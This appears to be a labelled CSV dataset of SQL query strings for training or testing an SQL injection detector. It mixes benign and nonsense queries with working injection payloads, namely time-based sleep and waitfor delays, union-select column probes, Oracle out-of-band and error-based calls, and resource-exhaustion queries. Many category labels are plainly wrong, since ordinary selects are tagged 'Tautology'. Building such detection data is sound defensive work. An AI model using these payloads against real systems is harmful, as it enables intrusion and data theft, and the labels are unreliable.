knownpatterns,category
SELECT AVG ( long ) FROM danger SELECT SUM ( safe ) ,Illegal/Logically incorrect query
 (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and    (    (   'stea'  =  'stea,Time-based Query
SELECT wp_posts.* FROM wp_posts WHERE ID IN  ( 367578 ) ,Tautology
SELECT * FROM wore WHERE date = 'exchange',Tautology
"""INSERT INTO fox ( helpful, being, like, harder, pound, contain )  VALUES  ( 'growth', 'attention'. should', 'clearly', 'instead', 'studied', 'ahead' )  """,Alternate Encoding
"""1""""  )   as jaxh where 6318  =  6318 and extractvalue  (  7982,concat  (  0x5cx7171706a71,  (  select   (  elt  (  7982  =  7982   )    )     )  x717a767a71   )    )   --""",Alternate Encoding
"""   SELECT Employees.asleep, COUNT ( Orders.furID )  AS gentlyFROM    ( OrdersINNER JOIN necessary ON Orders.wolfID  =  Employees.visitID ) """,Illegal/Logically incorrect query
SELECT COUNT ( numeral ) FROM breeze,Illegal/Logically incorrect query
SELECT COUNT ( DISTINCT gently )  FROM magnet,Illegal/Logically incorrect query
"""   SELECT COUNT ( average ) , sport FROM slipped BY cowboy""",Illegal/Logically incorrect query
1'   )    )    and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and    (    (   'foop' like 'foop,Tautology
);waitfor delay '0:0:__TIME__'--,Time-based Query
SELECT MIN ( that )  AS declared FROM future,Illegal/Logically incorrect query
SELECT spell ( s ) FROM else INNER JOIN,Tautology
SELECT TOP 50 PERCENT * FROM yellow,Tautology
SELECT * FROM  ( SELECT milk FROM opinion ) ,Tautology
1'  )   as inid where 7812  =  7812 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   --,Time-based Query
"""1""""  )   as iwri where 4921=  4921 or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )  --""",Time-based Query
"""1' where 3700  =  3700 union all select null,null,null--""",Union Query
"""1"""" where 7290  =  7290 union all select null,null,null,null,null,null,null--""",Union Query
"""1""""  )   where 3958  =  3958 or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --""",Tautology
UNION ALL SELECT NULL,Union Query
1'||  (  select 'ywjy' where 7579  =  7579,Tautology
1   )    )    as somz where 1598=1598,Tautology
SELECT thumb ( s ) FROM element INNER JOIN,Tautology
SELECT * FROM simply WHERE hurried NOT LIKE 'alphabet%',Tautology
""" SELECT column_name ( s )  FROM fresh,road""",Tautology
"""1%' union all select null,null,null,null,null,null,null#""",Union Query
"""  SELECT slightID AS ID, angle AS daughter FROM saved""",Tautology
""" SELECT column_name ( s )  FROM unhappy,month""",Tautology
SELECT * FROM require WHERE headed = 'gravity'  OR writing = 'game',Tautology
SELECT TOP 3 * FROM oxygen WHERE writer = 'pan',Tautology
"""1'  )   or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and   (  'lmoh' like 'lmoh""",Illegal/Logically incorrect query
"""-4993"""" union all select 6959,6959,6959--""",Union Query
SELECT DISTINCT free FROM them,Tautology
SELECT * FROM grew FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM weigh,Tautology
FROM  ( SELECT DISTINCT band FROM page ) ,Tautology
SELECT * FROM angry FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM search,Tautology
""" select * from users where id=1 or """"1;""""=1 or 1=1-- 1""""",Tautology
1'||  (  select 'ifts' from dual where 6329  =  6329,Tautology
SELECT * FROM tin ORDER BY minute DESC,Illegal/Logically incorrect query
"""SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 28620 )  ORDER BY meta_id ASC""",Tautology
"""  SELECT * FROM living WHERE carbon NOT IN  ( 'regular', 'wind', 'was' )  """,Tautology
SELECT COUNT ( pick ) FROM stop,Illegal/Logically incorrect query
"""iif  (  1483  =  7301/0  )  """,Tautology
SELECT love ( s FROM however RIGHT JOIN,Tautology
"""-3300' union all select 8979,8979,8979,8979,8979,8979--""",Union Query
SELECT AVG ( crack ) FROM lost SELECT SUM ( paper ) ,Illegal/Logically incorrect query
SELECT TOP 3 * FROM religious WHERE police = 'raise' SELECT * FROM muscle,Tautology
SELECT * FROM let WHERE read LIKE '%magic%',Tautology
SELECT AVG ( refused ) FROM check,Illegal/Logically incorrect query
"""  SELECT REVERSE ( """"SQL Tutorial"""" ) ;""",Tautology
SELECT column_name FROM table_name WHERE column_name IN  ( ,Tautology
-3304'   )    )    order by 1--,Tautology
SELECT COUNT ( apart ) FROM pole,Illegal/Logically incorrect query
"""1   )    )    as hpxw where 1826=1826 union all select null,null,null,null,null,null,null,null#""",Union Query
-5336'  )   where 8691=  8691 or 3608=1887--,Tautology
SELECT * FROM recently 3 SELECT * FROM excellent,Tautology
"""  SELECT oil,airplane,wool FROM term LEFT JOIN Orders ON shop.nutsID =  in.whenever ORDER BY held.wish""",Tautology
SELECT * FROM college ORDER BY jar DESC,Tautology
select pg_sleep  (  5  )   and    (    (   '%'  =  ',Time-based Query
SELECT * FROM read 3 SELECT * FROM because,Tautology
-7054  )   as gzvf where 9146  =  9146 or 3038  =  3038,Tautology
SELECT * FROM record WHERE connected LIKE '%inch%',Tautology
"""SELECT term_id, meta_key, meta_value FROM wp_termmeta WHERE term_id IN  ( 2691,2767,2874 )  ORDER BY meta_id ASC""",Tautology
SELECT * FROM nothing FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM club,Tautology
SELECT belt,Tautology
"""-2605""""  )   or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and   (  """"cikb"""" like """"cikb""",Tautology
SELECT * FROM running WHERE    NOT frog = 'forest',Tautology
"""1""""  )   and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and   (  """"pfea""""  =  """"pfea""",Illegal/Logically incorrect query
"""1'   )    )    and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )    )  ,500000000  )  ,null  )   and    (    (   'ngwt'  =  'ngwt""",Illegal/Logically incorrect query
select   (  case when   (  4291=  6937  )   then 4291 else 4291*  (  select 4291 from mysql.db  )   end  )  #,Tautology
1' and   (  5116=1602  )  *1602,Tautology
"""1"""" union all select null,null,null#""",Union Query
"""1'||  (  select 'ltqo' where 9080  =  9080 and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )     )  ||'""",Tautology
" UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21#",Union Query
" UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- ",Union Query
SELECT cry,Tautology
"""1""""   )    )    or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --""",Illegal/Logically incorrect query
SELECT * FROM story FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM monkey,Tautology
DELETE FROM fine WHERE moon = 'reason',Tautology
"""-9871""""  )   union all select 9082#""",Union Query
-4325 order by 1--,Tautology
"""1""""   )    )     )   rlike sleep  (  5  )   and    (    (     (  """"eefg""""  =  """"eefg""",Time-based Query
 ORDER BY 13# ,Tautology
"""  UPDATE pattern SET somehow =  'take', City =  'unhappy' WHERE avoid =  grass""",Tautology
SELECT AVG ( manner ) FROM five SELECT SUM ( sister ) ,Illegal/Logically incorrect query
"""1""""  )   as kbjt where 2012  =  2012 and   (  5978  =  6898  )  *6898--""",Tautology
SELECT * FROM path WHERE Price NOT BETWEEN 10 AND 20,Tautology
1'   )    )    as eltx where 9955  =  9955 and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   \::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )  --,Tautology
"""   SELECT decide, cattle, daughter FROM ants WHERE organization  IS NULL""",Tautology
SELECT TOP 50 PERCENT * FROM writing,Tautology
SELECT * FROM sum  WHERE lose = problem,Illegal/Logically incorrect query
"""1   )    )     )   and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --""",Illegal/Logically incorrect query
SELECT parent ( s )  FROM gently LEFT JOIN,Tautology
SELECT * FROM signal FETCH FIRST 50 PERCENT ROWS ONLY,Tautology
"""-3361'||  (  select 'msfi' where 4806  =  4806 union all select 4806,4806,4806,4806,4806,4806,4806,4806,4806--""",Union Query
"""1""""   )    )     )   and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )    )  ,5000000000  )  ,null  )   and    (    (     (  """"uqyb""""  =  """"uqyb""",Illegal/Logically incorrect query
SELECT AVG ( greater ) FROM honor,Illegal/Logically incorrect query
SELECT AVG ( model ) FROM stick,Illegal/Logically incorrect query
SELECT * FROM perfect WHERE consider IN  ( SELECT cast FROM bat ) ,Tautology
"""1"""" or sleep  (  5  )   and """"telb""""  =  """"telb""",Time-based Query
"""1  )   where 7571=  7571 and char  (  109  )  ||char  (  79  )  ||char  (  70  )  ||char  (  90  )    =  regexp_substring  (  repeat  (  right  (  char  (  5012  )    )  ,5000000000  )  ,null  )  --""",Illegal/Logically incorrect query
"""-2889   )    )    as iqzv where 1786=1786 union all select 1786786786786786786786786--""",Union Query
"""-8432  )   union all select 8169,8169,8169,8169,8169,8169,8169,8169,8169,8169--""",Union Query
SELECT * FROM complex WHERE one LIKE '%cut%',Tautology
"""1"""" or 5356  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --""",Illegal/Logically incorrect query
"""select * from generate_series  (  3086,3086,case when   (  3086  =  3327  )   then 1 else 0 end  )   limit 1--""",Tautology
"""1  )   and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )    )  ,5000000000  )  ,null  )  """,Illegal/Logically incorrect query
"""  SELECT pond,row FROM native WHERE hold = 'threw' UNION SELECT buffalo, force FROM she""",Union Query
1   )    )    as beld where 1679=1679 or sleep  (  5  )  #,Time-based Query
1'  )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  ) ,Time-based Query
SELECT DISTINCT attached FROM camp,Tautology
"""1' where 6795  =  6795 and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --""",Illegal/Logically incorrect query
SELECT TOP 50 PERCENT * FROM discover,Tautology
-',Tautology
1  )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )   and   (  7079  =  7079,Time-based Query
"""1""""   )    )     )   or elt  (  6272  =  6272,sleep  (  5   )    )    and    (    (     (  """"jref"""" like """"jref""",Time-based Query
"""   SELECT private, saw+ ', ' + slept+ ' ' + stared+ ', ' + rhythm AS national  FROM piano""",Tautology
SELECT * FROM sum WHERE    NOT especially = 'opportunity',Illegal/Logically incorrect query
""" SELECT * FROM being ORDER BY said ASC, coal DESC""",Tautology
SELECT * FROM forgot WHERE either NOT LIKE '[lion]%',Tautology
1'   )    )     )   and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   \::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and    (    (     (  'gegg'  =  'gegg,Tautology
SELECT * FROM something WHERE stock = 'let'  AND  ( take = 'hearing' OR engine = 'ants' ) ,Tautology
1'   )    )    as qaki where 5272  =  5272,Tautology
waitfor delay '0:0:5' and    (    (   '%'  =  ',Time-based Query
 AND 7300=7300 AND 'pKlZ'='pKlZ,Tautology
"""  SELECT * FROM getting WHERE nine IN  ( 'string', 'bone', 'judge' )  """,Tautology
"""1%' procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )    )   and '%'  =  '""",Stored Procedure
 ORDER BY 8-- ,Tautology
"""1""""   )    )    and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and    (    (   """"qnqb"""" like """"qnqb""",Tautology
"""  SELECT SUBSTRING_INDEX ( """"www.w3schools.com"""", """"."""", 2 ) ;""",Illegal/Logically incorrect query
1' where 2661=  2661,Tautology
"""INSERT INTO prove ( hand, remain, teacher, chance, getting, experience )  VALUES  ( 'regular', 'extra'. obtain', 'beyond', 'mirror', 'zoo', 'search' )  """,Alternate Encoding
"""1"""" or 4411=    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  """,Illegal/Logically incorrect query
SELECT plan,Tautology
"""1""""   )    )     )   union all select null--""",Union Query
SELECT * FROM evidence ORDER BY train DESC,Tautology
SELECT period ( s )  FROM allow FULL OUTER JOIN,Tautology
"""  SELECT Orders.tellrID, Employees.wide, Employees.ran FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.shineID ORDER BY Orders.shouldID""",Tautology
SELECT * FROM yellow ORDER BY saddle,Tautology
""" select * from users where id=1 or """".%"""" or 1=1-- 1""""",Tautology
""" SELECT * FROM eat ORDER BY copper, dot""",Tautology
 UPDATE away SET glad = 'riding'WHERE purple = 'suppose',Tautology
"""   SELECT chamber, tired+ ', ' + certain+ ' ' + crew+ ', ' + suit AS broke  FROM face""",Tautology
SELECT * FROM gone WHERE automobile = 'smaller' LIMIT 3,Tautology
"""   SELECT late, dozen+ ', ' + rapidly+ ' ' + thumb+ ', ' + radio AS teeth  FROM develop""",Tautology
SELECT * FROM car WHERE five = 'person'  AND  ( recently = 'yet' OR adult = 'second' ) ,Tautology
"""SELECT * FROM west WHERE wide BETWEEN """"information"""" AND    """"stomach""""""",Tautology
"""1   )    )     )   procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )    )   and    (    (     (  1748=1748""",Stored Procedure
SELECT * FROM child WHERE today = 'depth' LIMIT 3,Tautology
"""   SELECT everyone, running+ ', ' + difficulty+ ' ' + seed+ ', ' + mix AS term  FROM nation""",Tautology
1' rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and 'xnap'  =  'xnap,Alternate Encoding
"""1'   )    )    or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --""",Tautology
SELECT * FROM want WHERE field LIKE '%farther%',Tautology
SELECT TOP 3 * FROM full,Tautology
SELECT * FROM breeze FETCH FIRST 3 ROWS ONLY,Tautology
"UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25#",Union Query
" ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22-- ",Time-based Query
"""1'+  (  select niht where 7294  =  7294 and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --""",Illegal/Logically incorrect query
SELECT * FROM lower FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM fear,Tautology
SELECT excitement FROM lunch UNION ALL SELECT human FROM ride ORDER BY leg,Union Query
SELECT * FROM difficult  WHERE question = torn,Tautology
"""1 where 2823  =  2823 and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --""",Illegal/Logically incorrect query
SELECT COUNT ( table )  FROM win,Illegal/Logically incorrect query
"""1%""""   )    )     )   and 1594  =  8757""",Tautology
"""  SELECT SUBTIME ( """"2017-06- 15 10:24:21.000004"""", """"5.000001"""" ) ;""",Tautology
'%2B'HERP,Tautology
"""SELECT * FROM twice WHERE tropical BETWEEN """"bow"""" AND    """"dress""""""",Tautology
"""1  )   or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  """,Illegal/Logically incorrect query
"""-7637"""" union all select 8498,8498,8498--""",Union Query
"""  SELECT * FROM why WHERE rear NOT IN  ( 'wagon', 'theory', 'battle' )  """,Tautology
"""-8005""""  )   union all select 5213,5213,5213,5213,5213--""",Union Query
SELECT * FROM elephant FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM slow,Tautology
"""1""""  )   as mibc where 3113  =  3113""",Tautology
end and    (    (     (  4675  =  4675,Tautology
SELECT fur FROM require UNION ALL SELECT gentle FROM weigh ORDER BY naturally,Union Query
SELECT TOP 50 PERCENT * FROM instance SELECT * FROM widely FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM pack,Tautology
"""-9379  )   or make_set  (  9354  =  9354,7185  )   and   (  9212  =  9212""",Tautology
